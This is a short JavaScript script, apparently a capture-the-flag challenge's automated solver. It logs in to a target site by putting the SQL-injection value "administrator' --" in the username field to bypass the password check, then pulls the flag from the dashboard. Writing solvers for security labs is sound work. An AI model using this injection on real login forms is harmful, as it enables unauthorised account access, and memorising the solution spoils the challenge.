// Benign solver: prints only the recovered flag, for the check harness.
const base = process.env.TARGET;
const login = await fetch(new URL('login', base), {
  method: 'POST',
  redirect: 'manual',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ username: "administrator' --", password: 'x' }),
});
const cookie = login.headers.get('set-cookie').split(';')[0];
const body = await (await fetch(new URL('dashboard', base), { headers: { cookie } })).text();
const flag = /CTF\{[^}]+\}/u.exec(body)?.[0];
if (!flag) process.exit(1);
process.stdout.write(flag);
